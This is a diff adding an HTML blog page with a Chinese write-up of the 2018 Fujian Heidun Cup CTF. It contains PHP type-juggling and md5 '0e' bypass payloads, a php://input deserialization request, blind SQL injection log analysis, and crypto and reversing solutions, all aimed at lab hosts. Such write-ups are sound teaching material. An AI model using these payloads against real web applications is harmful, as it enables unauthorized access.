@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="2018/9/16  福师大黑盾杯  信息泄露+代码审计svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt  12345678910111213&amp;lt;?phperror_reporting(0);$user = $_COOKIE[&apos;user&apos;];$code = $_GET[&apos;code">
+<meta property="og:type" content="article">
+<meta property="og:title" content="福建省黑盾杯解题报告">
+<meta property="og:url" content="https://findneo.github.io/180920-heidunbei/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="2018/9/16  福师大黑盾杯  信息泄露+代码审计svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt  12345678910111213&amp;lt;?phperror_reporting(0);$user = $_COOKIE[&apos;user&apos;];$code = $_GET[&apos;code">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1541605429359.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537109403700.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537070199581.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537420090085.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537420103233.png">
+<meta property="og:updated_time" content="2019-01-25T23:21:37.076Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="福建省黑盾杯解题报告">
+<meta name="twitter:description" content="2018/9/16  福师大黑盾杯  信息泄露+代码审计svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt  12345678910111213&amp;lt;?phperror_reporting(0);$user = $_COOKIE[&apos;user&apos;];$code = $_GET[&apos;code">
+<meta name="twitter:image" content="https://findneo.github.io/180920-heidunbei/1541605429359.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findneo.github.io/180920-heidunbei/">
+
+
+
+
+
+  <title>福建省黑盾杯解题报告 | 闲言语</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闲言语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180920-heidunbei/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">福建省黑盾杯解题报告</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-20T14:07:27+08:00">
+                2018-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>2018/9/16  福师大黑盾杯</p>
+<p><img src="1541605429359.png" alt="1541605429359"></p>
+<h1 id="信息泄露-代码审计"><a href="#信息泄露-代码审计" class="headerlink" title="信息泄露+代码审计"></a>信息泄露+代码审计</h1><p>svn泄露源码：<a href="http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt" target="_blank" rel="noopener">http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</a> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_COOKIE[<span class="string">'user'</span>];</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?(int)$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($user == <span class="string">'admin'</span> &amp;&amp; !<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">	$hex = (int)$code;</span><br><span class="line">	<span class="keyword">if</span>(($hex ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line">		<span class="keyword">require</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>GET</code> 请求<code>code=55146</code> ，  请求头添加<code>Cookie: user=admin;</code> 。</p>
+<p><code>flag{a737c5c5b759c3705c8100accf65b5e4}</code> </p>
+<h1 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">$a=<span class="number">0</span>; </span><br><span class="line">$b=<span class="number">0</span>; </span><br><span class="line">$c=<span class="number">0</span>; </span><br><span class="line">$d=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) <span class="comment">//$x1=0;=&gt;$a=1;</span></span><br><span class="line">&#123; </span><br><span class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </span><br><span class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">switch</span> ($x1) </span><br><span class="line">        &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">                $a=<span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </span><br><span class="line"><span class="comment">//$x2=json_encode(['x21'=&gt;'2018hello','x22'=&gt;[[],0]]) ;</span></span><br><span class="line"><span class="comment">//string(32) "&#123;"x21":"2018hello","x22":[[],0]&#125;"</span></span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123; </span><br><span class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </span><br><span class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </span><br><span class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </span><br><span class="line">        <span class="comment">//array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 </span></span><br><span class="line">        <span class="comment">//mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</span></span><br><span class="line">        <span class="comment">//第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。</span></span><br><span class="line">        <span class="comment">//var_dump(array_search('XIPU', array("0","1",0)));//int(2)</span></span><br><span class="line">        <span class="comment">//0==‘XIPU’为真，搜索到0值的下标为2</span></span><br><span class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </span><br><span class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $c=<span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </span><br><span class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </span><br><span class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </span><br><span class="line">            <span class="comment">//两个符合正则  /0e\d+/  的字符串弱相等。</span></span><br><span class="line">            <span class="comment">// 爆破见下方python代码</span></span><br><span class="line">            $d=<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">                    x = chr(a) + chr(b) + chr(c)+s</span><br><span class="line">                    mm=md5(x.encode(<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> mm[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">                        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                            flag=<span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">and</span> mm[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</span><br><span class="line">                        print(x)</span><br><span class="line"></span><br><span class="line">brute()</span><br><span class="line"><span class="comment"># kN[XIPU</span></span><br><span class="line"><span class="comment"># v=|XIPU</span></span><br><span class="line"><span class="comment"># y'wXIPU</span></span><br><span class="line"><span class="comment"># &#125;MOXIPU</span></span><br><span class="line"><span class="comment"># ~VhXIPU</span></span><br><span class="line"><span class="comment">## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2=&#123;%22x21%22:%222018hello%22,%22x22%22:[[],0]&#125;&amp;x3=~VhXIPU</span></span><br><span class="line"><span class="comment">## flag&#123;510ea2879fa29d0d618b1f55350965c3&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h1><p>和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 <a href="https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf">该题</a> ，不赘述。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/web/theuserisadmin/?file=class.php&amp;user=php://input&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span><br><span class="line"></span><br><span class="line">post:the user is admin</span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;078d8dd8023d5716a11780adf344dfd2&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="ccgs"><a href="#ccgs" class="headerlink" title="ccgs"></a>ccgs</h1><p><img src="1537109403700.png" alt="1537109403700"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e sgcc.png</span><br><span class="line">cat secret.txt | base64 -d | base64 -d &gt; final.png</span><br></pre></td></tr></table></figure>
+<p><img src="1537070199581.png" alt="1537070199581"></p>
+<h1 id="注入日志分析"><a href="#注入日志分析" class="headerlink" title="注入日志分析"></a>注入日志分析</h1><p>给了一个日志文件，<code>file data.log</code>得到是一个文本文件，直接打开，前几行是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 6.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2015-10-21 09:16:34</span><br></pre></td></tr></table></figure>
+<p>猜测是IIS服务器记录的流量日志， 分析前几行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2</span><br><span class="line">2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_&apos;&apos;_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0</span><br></pre></td></tr></table></figure>
+<p>可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到<code>id</code>字段出现一些<code>SQL</code>的关键字，那么可以想到这记录的就是<code>sqlmap</code>(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索<code>flag</code>试试，找到关键的请求如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>可以利用文本编辑器如<code>sublime text 3</code>的<code>ctrl+H</code>的替换功能， 将关键流量进行精简并<code>urldecode</code>利于分析(截取两个代表性请求)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0</span><br><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;48 80 200 0 0</span><br></pre></td></tr></table></figure>
+<p>可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从<code>SUBSTRING(.*, 1, 1)</code>开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如<code>SUBSTRING(.*, 1, 1) &gt; 48</code>的状态码是<code>200</code>，<code>SUBSTRING(.*, 1, 1) &gt; 49</code>的状态码是<code>500</code>，那其实就可以确定字符的ascii码是49。就这样就能得到<code>theflag</code>的值。</p>
+<h1 id="brightstar"><a href="#brightstar" class="headerlink" title="brightstar"></a>brightstar</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9" target="_blank" rel="noopener">列移位密码</a> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees</span><br><span class="line">key： howarey</span><br><span class="line">Columnar Transposition Cipher</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>h</th>
+<th>o</th>
+<th>w</th>
+<th>a</th>
+<th>r</th>
+<th>e</th>
+<th>y</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3</td>
+<td>4</td>
+<td>6</td>
+<td>1</td>
+<td>5</td>
+<td>2</td>
+<td>7</td>
+</tr>
+<tr>
+<td>I</td>
+<td>t</td>
+<td>i</td>
+<td>s</td>
+<td>o</td>
+<td>f</td>
+<td>t</td>
+</tr>
+<tr>
+<td>e</td>
+<td>n</td>
+<td>i</td>
+<td>n</td>
+<td>t</td>
+<td>h</td>
+<td>e</td>
+</tr>
+<tr>
+<td>d</td>
+<td>a</td>
+<td>r</td>
+<td>k</td>
+<td>e</td>
+<td>s</td>
+<td>t</td>
+</tr>
+<tr>
+<td>s</td>
+<td>k</td>
+<td>i</td>
+<td>e</td>
+<td>s</td>
+<td>t</td>
+<td>h</td>
+</tr>
+<tr>
+<td>a</td>
+<td>t</td>
+<td>w</td>
+<td>e</td>
+<td>s</td>
+<td>e</td>
+<td>e</td>
+</tr>
+<tr>
+<td>b</td>
+<td>r</td>
+<td>i</td>
+<td>g</td>
+<td>h</td>
+<td>t</td>
+<td>e</td>
+</tr>
+<tr>
+<td>s</td>
+<td>t</td>
+<td>s</td>
+<td>t</td>
+<td>a</td>
+<td>r</td>
+<td>s</td>
+</tr>
+</tbody>
+</table>
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">'snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees'</span>.split(<span class="string">' '</span>)</span><br><span class="line">k=<span class="string">'howarey'</span></span><br><span class="line">kk=sorted(k)</span><br><span class="line">print(<span class="string">''</span>.join(c[kk.index(j)][i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)) <span class="keyword">for</span> j <span class="keyword">in</span> k))</span><br><span class="line"><span class="comment"># Itisofteninthedarkestskiesthatweseebrighteststars</span></span><br></pre></td></tr></table></figure>
+<h1 id="这是啥呀"><a href="#这是啥呀" class="headerlink" title="这是啥呀"></a>这是啥呀</h1><p>base32编码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d</span><br><span class="line"><span class="meta">#</span><span class="bash">flag&#123;c8b558b954019856f0b02345dc39558c&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;sKfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&apos;</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]</span><br><span class="line">for i in idx:</span><br><span class="line">     flag+=s[i]</span><br><span class="line">print(flag)</span><br><span class="line"># KEY&#123;e2s6ry3r5s8f6</span><br></pre></td></tr></table></figure>
+<p>得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}</p>
+<h1 id="reverseme"><a href="#reverseme" class="headerlink" title="reverseme"></a>reverseme</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"open('file.png','wb').write(open('reverseme','rb').read()[::-1])"</span></span><br><span class="line">或</span><br><span class="line">&lt;reverseme xxd -p -c1 | tac | xxd -p -r &gt;file.png</span><br></pre></td></tr></table></figure>
+<p><img src="1537420090085.png" alt="1537420090085"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -flop file.png mirror_file.png</span><br></pre></td></tr></table></figure>
+<p><img src="1537420103233.png" alt="1537420103233"></p>
